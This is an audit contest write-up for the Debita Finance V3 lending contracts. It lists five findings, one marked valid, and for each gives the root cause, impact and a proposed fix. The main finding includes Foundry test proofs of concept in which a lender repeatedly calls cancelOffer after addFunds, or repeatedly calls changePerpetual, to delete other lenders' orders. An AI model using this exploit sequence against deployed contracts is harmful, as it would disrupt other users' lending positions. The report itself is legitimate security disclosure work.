+++
start-date = "2024-11-19"
end-date = "2024-11-25"
total-time = "25h"
total-rewards = "36.56 USDC"
author = "0xSolus"
+++

# Sherlock Audit Contest Details 
[Debita Finance V3](https://audits.sherlock.xyz/contests/627)  

# Findings Summary

| ID     | Title                                                                              | Severity | Status       | Reward     |
| ------ | ---------------------------------------------------------------------------------- | -------- | ------------ | ---------- |
| [M-01] | Lender can grief the protocol, deleting all Lender Positions in Factory            | Medium   | Valid        | 36.56 USDC |
| [M-02] | Off-by-One Error in For Loop Preventing Last Element Access                        | Medium   | Invalid      | 0     USDC |
| [M-03] | State Variable Shadowing in `changeOwner()` Function                               | Medium   | Invalid      | 0     USDC |
| [M-04] | Proxy for implementation contracts is used, but there is no methods to change them | Medium   | Invalid      | 0     USDC |
| [M-05] | Incorrect Borrower/Lender Identification in tokenURI Logic                         | Medium   | Invalid      | 0     USDC |


# Detailed Findings

## [M-1] Lender can grief the protocol, deleting all Lender Positions in Factory.

### Summary 
A Lender can delete their offer multiple times. If done more than once, this will 
cause the deletion of other lending offers in `DebitaLendOfferFactory`.

### Root Cause
Once a Lender creates his offer, he has the option of canceling it through 
[DebitaLendOffer-Implementation.sol::cancelOffer()](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/main/Debita-V3-Contracts/contracts/DebitaLendOffer-Implementation.sol#L144). This will successfully delete his offer in `DebitaLendOfferFactory`. The problem here is that `cancelOffer()` can be called more than once if the lender adds more funds through [DebitaLendOffer-Implementation.sol::addFunds()](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/main/Debita-V3-Contracts/contracts/DebitaLendOffer-Implementation.sol#L162) bypassing this [check](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/main/Debita-V3-Contracts/contracts/DebitaLendOffer-Implementation.sol#L148) in `cancelOffer()`.

In consequence, as the lenders offer was already deleted, when the following function is called [deleteOrder()](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/main/Debita-V3-Contracts/contracts/DebitaLendOfferFactory.sol#L207) their index `uint index = LendOrderIndex[_lendOrder];` is `0` causing the deletion of the currently lender offer at index 0. 
```       
// switch index of the last borrow order to the deleted borrow order
allActiveLendOrders[index] = allActiveLendOrders[activeOrdersCount - 1];
```

The same behavior can be achieved using [DebitaLendOffer-Implementation.sol::changePerpetual()](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/main/Debita-V3-Contracts/contracts/DebitaLendOffer-Implementation.sol#L178). As this function can be called also multiple times as long as their offer was fullfilled and is `perpetual`. 

### Impact
The protocol can be griefed by an attacker with a Lender position. The Attacker is able to delete all the lending offers in `DebitaLendOfferFactory.sol`. In consequence, all the deleted offers won't be able to be matched to create Loans with borrowers as their addresses get lost and won't be retrieved through [DebitaLendOfferFactory.sol::getActiveOrders()](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/main/Debita-V3-Contracts/contracts/DebitaLendOfferFactory.sol#L222C14-L222C29)

### PoC
The following tests are written in [BasicDebitaAggregator.t.sol](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/main/Debita-V3-Contracts/test/local/Aggregator/BasicDebitaAggregator.t.sol).

```solidity
    function testAuditGriefingCancelOffer() public {
        bool[] memory oraclesActivated = allDynamicData.getDynamicBoolArray(1);
        uint[] memory ltvs = allDynamicData.getDynamicUintArray(1);
        uint[] memory ratio = allDynamicData.getDynamicUintArray(1);

        address[] memory acceptedPrinciples = allDynamicData
            .getDynamicAddressArray(1);
        address[] memory oraclesPrinciples = allDynamicData
            .getDynamicAddressArray(1);
        address[] memory lendOrders = allDynamicData
            .getDynamicAddressArray(5);

        ratio[0] = 1e18;
        oraclesPrinciples[0] = address(0x0);
        acceptedPrinciples[0] = AERO;
        oraclesActivated[0] = false;
        ltvs[0] = 0;

        // Create 5 Lend Orders
        for(uint i = 0; i < 5; i++) {
          lendOrders[i] = DLOFactoryContract.createLendOrder(
              true,
              oraclesActivated,
              false,
              ltvs,
              1000,
              8640000,
              86400,
              acceptedPrinciples,
              AERO,
              oraclesPrinciples,
              ratio,
              address(0x0),
              5e18
          );
        }

        uint256 length = DLOFactoryContract.getActiveOrders(0, 5).length;
        assertEq(length, 5);
        DLOImplementation lender1 = DLOImplementation(lendOrders[0]);

        // We cancel our own offer. 
        lender1.cancelOffer();
        // But this can be called again if we addFunds, causing deletion of offers
        // from DLOFactoryContract at index 0. 
        IERC20(AERO).approve(address(lender1), 25e18);
        lender1.addFunds(5e18);
        lender1.cancelOffer();
        lender1.addFunds(5e18);
        lender1.cancelOffer();
        lender1.addFunds(5e18);
        lender1.cancelOffer();
        lender1.addFunds(5e18);
        lender1.cancelOffer();
        lender1.addFunds(5e18);
        lender1.cancelOffer();

        // All other offers got deleted
        assertEq(DLOFactoryContract.activeOrdersCount(), 0);
    }
```

```solidity
    function testAuditGriefingChangePerpetual() public {
        bool[] memory oraclesActivated = allDynamicData.getDynamicBoolArray(1);
        uint[] memory ltvs = allDynamicData.getDynamicUintArray(1);
        uint[] memory ratio = allDynamicData.getDynamicUintArray(1);

        address[] memory acceptedPrinciples = allDynamicData
            .getDynamicAddressArray(1);
        address[] memory oraclesPrinciples = allDynamicData
            .getDynamicAddressArray(1);
        address[] memory lendOrders = allDynamicData
            .getDynamicAddressArray(5);

        ratio[0] = 2e18;
        oraclesPrinciples[0] = address(0x0);
        acceptedPrinciples[0] = AERO;
        oraclesActivated[0] = false;
        ltvs[0] = 0;

        // Create 5 Lend Orders
        for(uint i = 0; i < 5; i++) {
          // Order has to be perpetual
          lendOrders[i] = DLOFactoryContract.createLendOrder(
              true,
              oraclesActivated,
              false,
              ltvs,
              1000,
              8640000,
              86400,
              acceptedPrinciples,
              AERO,
              oraclesPrinciples,
              ratio,
              address(0x0),
              5e18
          );
        }

        address[] memory lendOrdersArr = allDynamicData.getDynamicAddressArray(1);
        uint[] memory lendAmountPerOrder = allDynamicData.getDynamicUintArray(1);
        uint[] memory porcentageOfRatioPerLendOrder = allDynamicData
            .getDynamicUintArray(1);
        address[] memory principles = allDynamicData.getDynamicAddressArray(1);
        uint[] memory indexForPrinciple_BorrowOrder = allDynamicData
            .getDynamicUintArray(1);
        uint[] memory indexForCollateral_LendOrder = allDynamicData
            .getDynamicUintArray(1);
        uint[] memory indexPrinciple_LendOrder = allDynamicData
            .getDynamicUintArray(1);

        lendOrdersArr[0] = lendOrders[0];
        lendAmountPerOrder[0] = 5e18;
        porcentageOfRatioPerLendOrder[0] = 10000;
        principles[0] = AERO;
        indexForPrinciple_BorrowOrder[0] = 0;
        indexForCollateral_LendOrder[0] = 0;
        indexPrinciple_LendOrder[0] = 0;

        // We match the Offer to decrease availableAmount in lender1
        address loan = DebitaV3AggregatorContract.matchOffersV3(
            lendOrdersArr,
            lendAmountPerOrder,
            porcentageOfRatioPerLendOrder,
            address(BorrowOrder),
            principles,
            indexForPrinciple_BorrowOrder,
            indexForCollateral_LendOrder,
            indexPrinciple_LendOrder
        );
        
        DLOImplementation lender1 = DLOImplementation(lendOrders[0]);
        uint256 length = DLOFactoryContract.getActiveOrders(0, 5).length;
        assertEq(length, 5);

        lender1.changePerpetual(false);
        lender1.changePerpetual(false);
        lender1.changePerpetual(false);
        lender1.changePerpetual(false);
        lender1.changePerpetual(false);
        lender1.changePerpetual(false);

        // All other offers got deleted
        assertEq(DLOFactoryContract.activeOrdersCount(), 0);
    }

```

### Mitigation
1. Consider requiring that the offer is active when adding funds. 
```solidity
    // only loans or owner can call this functions --> add more funds to the offer
    function addFunds(uint amount) public nonReentrant {
        require(isActive, "Offer is not active");
        require(
            msg.sender == lendInformation.owner ||
                IAggregator(aggregatorContract).isSenderALoan(msg.sender),
            "Only owner or loan"
        );
        SafeERC20.safeTransferFrom(
            IERC20(lendInformation.principle),
            msg.sender,
            address(this),
            amount
        );
        lendInformation.availableAmount += amount;
        IDLOFactory(factoryContract).emitUpdate(address(this));
    }
```
2. Consider flaging to inactive on `changePerpetual()` if order is going to be deleted.
```solidity
    function changePerpetual(bool _perpetual) public onlyOwner nonReentrant {
        require(isActive, "Offer is not active");

        lendInformation.perpetual = _perpetual;
        if (_perpetual == false && lendInformation.availableAmount == 0) {
            isActive = false;
            IDLOFactory(factoryContract).emitDelete(address(this));
            IDLOFactory(factoryContract).deleteOrder(address(this));
        } else {
            IDLOFactory(factoryContract).emitUpdate(address(this));
        }
    }

```
 
## [M-2] Off-by-One Error in For Loop Preventing Last Element Access.

### Summary
In `DebitaV3Aggregator.sol::getAllLoans()` the last loan is never returned. 

### Root Cause
In DebitaV3Aggregator.sol every time a loan is created with matchOffersV3() loanID is incremented:
```solidity
    function matchOffersV3(
        address[] memory lendOrders,
        uint[] memory lendAmountPerOrder,
        uint[] memory porcentageOfRatioPerLendOrder,
        address borrowOrder,
        address[] memory principles,
        uint[] memory indexForPrinciple_BorrowOrder,
        uint[] memory indexForCollateral_LendOrder,
        uint[] memory indexPrinciple_LendOrder
    ) external nonReentrant returns (address) {
        // Add count
        loanID++;
        ...
```
Therefore loanID is the last value, but in getAllLoans() loanID is omitted:
```solidity
    function getAllLoans(
        uint offset,
        uint limit
    ) external view returns (DebitaV3Loan.LoanData[] memory) {
        // return LoanData
        uint _limit = loanID;
        if (limit > _limit) {
            limit = _limit;
        }

        DebitaV3Loan.LoanData[] memory loans = new DebitaV3Loan.LoanData[](
            limit - offset
        );

        for (uint i = 0; i < limit - offset; i++) {
            // @audit loanID is omitted here, as this will break
            if ((i + offset + 1) >= loanID) {
                break;
            }
            address loanAddress = getAddressById[i + offset + 1];

            DebitaV3Loan loan = DebitaV3Loan(loanAddress);
            loans[i] = loan.getLoanData();

            // loanIDs start at 1
        }
        return loans;
    }
```

### PoC
```solidity
  function test_getAllLoans() public {
    // Simulate loanIDs -> 1-10 are active, when a loan is created it has the value
    // of loanID. In this scenario, last loan will be with loanID = 10. 
    uint loanID = 10;

    uint limit = 10;
    uint offset = 2;

    uint _limit = loanID;
    if (limit > _limit) {
        limit = _limit;
    }

    for (uint i = 0; i < limit - offset; i++) {
      // @audit Last loan is never reached.
      // consider using > instead of >=.
      if ((i + offset + 1) >= loanID) {
        break;
      }
      console.log(i + offset + 1);
    }
  }
```
```
Traces:
  [5764] TestAudit::test_getAllLoans()
    ├─ [0] console::log(3) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log(4) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log(5) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log(6) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log(7) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log(8) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log(9) [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Return] 
```

### Mitigation
```solidity
    function getAllLoans(
        uint offset,
        uint limit
    ) external view returns (DebitaV3Loan.LoanData[] memory) {
        // return LoanData
        uint _limit = loanID;
        if (limit > _limit) {
            limit = _limit;
        }

        DebitaV3Loan.LoanData[] memory loans = new DebitaV3Loan.LoanData[](
            limit - offset
        );

        for (uint i = 0; i < limit - offset; i++) {
            //@audit Change >= for > to allow access to last loanID.
            if ((i + offset + 1) > loanID) {
                break;
            }
            address loanAddress = getAddressById[i + offset + 1];

            DebitaV3Loan loan = DebitaV3Loan(loanAddress);
            loans[i] = loan.getLoanData();

            // loanIDs start at 1
        }
        return loans;
    }
```

## [M-3] State Variable Shadowing in `changeOwner()` Function. 
### Summary

The `changeOwner()` function in multiple contract fails to properly update the global `owner` state variable due to a shadowing issue caused by a function parameter with the same name. This results in the ownership change mechanism being non-functional.

Code Affected:
[DebitaV3Aggregator.sol::changeOwner()](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/main/Debita-V3-Contracts/contracts/DebitaV3Aggregator.sol#L682)
[AuctionFactory.sol::changeOwner()](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/main/Debita-V3-Contracts/contracts/auctions/AuctionFactory.sol#L218)
[BuyOrderFactory.sol::changeOwner()](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/main/Debita-V3-Contracts/contracts/buyOrders/buyOrderFactory.sol#L186)

### Root Cause

The function argument `owner` shadows the state variable `owner`. The assignment `owner = owner` operates on the function argument in the local scope rather than the global state variable. As a result, the global `owner` remains unchanged.

### Impact

The bug does not allow the ownership of the contract to be updated, effectively rendering the `changeOwner()` function useless.

### PoC

This PoC applies for the other instances as well, as it's the same code:
```solidity
    function test_changeOwner() public {
      vm.warp(block.timestamp + 7 hours);
      vm.prank(address(this));
      DebitaV3AggregatorContract.changeOwner(address(0xdead));
      // @audit This will always revert with Only owner
      assertEq(DebitaV3AggregatorContract.owner(), address(0xdead));
```

### Mitigation

To fix the issue, avoid using the same name for the function parameter and the state variable. Update the function to properly assign the new value to the global owner state variable:

```solidity
function changeOwner(address newOwner) public {
    require(msg.sender == owner, "Only owner can call this function");
    require(deployedTime + 6 hours > block.timestamp, "6 hours passed");
    owner = newOwner; // Correctly updates the global owner
}
```

## [M-4] Proxy for implementation contracts is used, but there is no methods to change them. 

### Summary

The Factory contracts are designed to create proxy-based lend orders, borrowOrders and buyOrders that rely on the `implementationContract` for logic execution. However, the following factory contracts lacks a mechanism to update the `implementationContract` address, which prevents the protocol from upgrading the implementation logic. 

Affected Code:
[DebitaLendOfferFactory.sol](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/7c27d42a8961ca2f1320afb3a7b55a5cfa027da5/Debita-V3-Contracts/contracts/DebitaLendOfferFactory.sol#L93)
[buyOrderFactory.sol](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/7c27d42a8961ca2f1320afb3a7b55a5cfa027da5/Debita-V3-Contracts/contracts/buyOrders/buyOrderFactory.sol#L52)
[DebitaBorrowOffer-Factory.sol](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/7c27d42a8961ca2f1320afb3a7b55a5cfa027da5/Debita-V3-Contracts/contracts/DebitaBorrowOffer-Factory.sol#L48)

### Impact

Once deployed, the factory contract cannot point new proxies to updated implementations, forcing a redeployment of the entire factory for future upgrades.


### Mitigation

Introduce a mechanism in the factory to allow updates to the implementationContract. This should include appropriate access control and safeguards to ensure the process is secure and transparent.

Example:
```solidity
    function updateImplementationContract(address newImplementation) external {
        require(msg.sender == owner, "Only owner can update");
        require(newImplementation != address(0), "Invalid address");
        implementationContract = newImplementation;
}

```

## [M-5] Incorrect Borrower/Lender Identification in tokenURI Logic

### Summary

The [DebitaLoanOwnerships.sol::tokenURI()](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/7c27d42a8961ca2f1320afb3a7b55a5cfa027da5/Debita-V3-Contracts/contracts/DebitaLoanOwnerships.sol) function uses the parity of `tokenId` to differentiate between borrowers and lenders, setting ` _type` to "Borrower" for even tokenIds and "Lender" for odd tokenIds. However, this logic fails in scenarios where the assignment of tokenId does not conform to this parity rule, leading to incorrect metadata for the NFTs. This could mislead users and cause inconsistencies in loan representations.

### Root Cause

When a `matchOffer` is created through [matchOfferV3()](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/7c27d42a8961ca2f1320afb3a7b55a5cfa027da5/Debita-V3-Contracts/contracts/DebitaV3Aggregator.sol#L502) the lendOrders get minted an `Ownership` token in a sequential order before the borrowerOrder. 

### Impact

**Incorrect NFT Metadata:** Borrowers may be labeled as lenders and vice versa, causing confusion among users relying on the metadata for decision-making.

### PoC

If the loan created  through `matchOfferV3()` is composed by 5 lenders and 1 borrower, then lenders will have tokenIds 1..5 and borrower 6. Therefore the lender in positions 2,4 will be granted a token with those ids. If you call the `DebitaLoanOwnership::tokenURI()` of tokens 2,4 the `_type` parameter will classify them as borrowers instead of lenders. Thus returning incorrect metadata for the token.

### Mitigation

A possible implemenetation will be to pass the `_type` as a boolean on `mint(address, boolean)`  in [mint](https://github.com/sherlock-audit/2024-11-debita-finance-v3-noahfigueras/blob/7c27d42a8961ca2f1320afb3a7b55a5cfa027da5/Debita-V3-Contracts/contracts/DebitaLoanOwnerships.sol#L34)and store it in a mapping;
```solidity
mapping(uint256 => bool) public isBorrower;
string memory _type = isBorrower[tokenId] ? "Borrower" : "Lender";
```

